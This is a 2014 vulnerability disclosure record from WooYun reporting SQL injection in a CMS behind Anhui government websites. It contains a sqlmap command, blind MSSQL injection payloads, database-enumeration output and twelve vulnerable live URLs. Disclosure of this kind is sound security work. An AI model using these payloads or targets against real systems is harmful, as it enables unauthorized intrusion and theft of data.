{"id": 51735, "wybug_id": "wooyun-2014-073512", "wybug_title": "安徽某CMS存在SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "大大灰狼", "wybug_date": "2014-08-25 16:33", "wybug_open_date": "2014-10-09 16:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向公众公开  简要描述： 大量政府网站受影响，随机测试了12家。 详细说明：  sqlmap.py -u http://bb.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1  --dbs共32个数据库\n---Place: GETParameter: gqtype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: gqtype=1 AND 6952=6952    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: gqtype=-2676 OR 3925=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)---[20:57:45] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 4.0.30128back-end DBMS: Microsoft SQL Server 2012[20:57:45] [INFO] fetching database names[20:57:45] [INFO] fetching number of databases[20:57:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[20:57:45] [INFO] retrieved:[20:57:46] [WARNING] reflective value(s) found and filtering out32[20:57:55] [INFO] retrieved: ahcs.com.cn[20:59:21] [INFO] retrieved: ahnjh.gov.cn[21:01:34] [INFO] retrieved: ahnjh.gov.cn_sx[21:04:05] [INFO] retrieved: ahnw[21:04:36] [INFO] retrieved: ahnw.gov.cn_2009nj[21:07:27] [INFO] retrieved: ahnw.gov.cn_CountyOA[21:10:22] [INFO] retrieved: ahnw.gov.cn_education[21:13:22] [INFO] retrieved: ahnw.gov.cn_hfnjh[21:15:33] [INFO] retrieved: ahnw.gov.cn_statics[21:18:15] [INFO] retrieved: ahxf.gov.cn_ah_village[21:21:01] [INFO] retrieved: ahxf.gov.cn_Party_XXG[21:25:11] [INFO] retrieved: ahxf.gov.cn_partyEdu[21:28:19] [INFO] retrieved: ahyy.org.cn[21:29:56] [INFO] retrieved: aisc.org.cn[21:31:18] [INFO] retrieved: aq.ahxf.gov.cn[21:33:07] [INFO] retrieved: bbs.ahnw.gov.cn[21:35:19] [INFO] retrieved: blog.ahnw.gov.cn[21:37:19] [INFO] retrieved: bt2013.ahnjh.gov.cn\n经测试，受影响的站点URL：http://xc.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://hn.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://bb.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1 http://szsx.ahnw.gov.cn/aspx/gqxx.aspx/gqxx.aspx?gqtype=1http://chz.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://qy.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://szlb.ahnw.gov.cn/aspx/gqxx.aspx/gqxx.aspx?gqtype=1http://bz.ahnw.gov.cn/aspx/gqxx.aspx/gqxx.aspx?gqtype=1http://tl.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://sc.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://hsnw.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1http://la.ahnw.gov.cn/aspx/gqxx.aspx?gqtype=1   漏洞证明：  \n---Place: GETParameter: gqtype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: gqtype=1 AND 6952=6952    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: gqtype=-2676 OR 3925=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)---[20:57:45] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 4.0.30128back-end DBMS: Microsoft SQL Server 2012[20:57:45] [INFO] fetching database names[20:57:45] [INFO] fetching number of databases[20:57:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[20:57:45] [INFO] retrieved:[20:57:46] [WARNING] reflective value(s) found and filtering out32[20:57:55] [INFO] retrieved: ahcs.com.cn[20:59:21] [INFO] retrieved: ahnjh.gov.cn[21:01:34] [INFO] retrieved: ahnjh.gov.cn_sx[21:04:05] [INFO] retrieved: ahnw[21:04:36] [INFO] retrieved: ahnw.gov.cn_2009nj[21:07:27] [INFO] retrieved: ahnw.gov.cn_CountyOA[21:10:22] [INFO] retrieved: ahnw.gov.cn_education[21:13:22] [INFO] retrieved: ahnw.gov.cn_hfnjh[21:15:33] [INFO] retrieved: ahnw.gov.cn_statics[21:18:15] [INFO] retrieved: ahxf.gov.cn_ah_village[21:21:01] [INFO] retrieved: ahxf.gov.cn_Party_XXG[21:25:11] [INFO] retrieved: ahxf.gov.cn_partyEdu[21:28:19] [INFO] retrieved: ahyy.org.cn[21:29:56] [INFO] retrieved: aisc.org.cn[21:31:18] [INFO] retrieved: aq.ahxf.gov.cn[21:33:07] [INFO] retrieved: bbs.ahnw.gov.cn[21:35:19] [INFO] retrieved: blog.ahnw.gov.cn[21:37:19] [INFO] retrieved: bt2013.ahnjh.gov.cn\n   修复方案：  过滤参数   版权声明：转载请注明来源 大大灰狼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-30 12:27 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}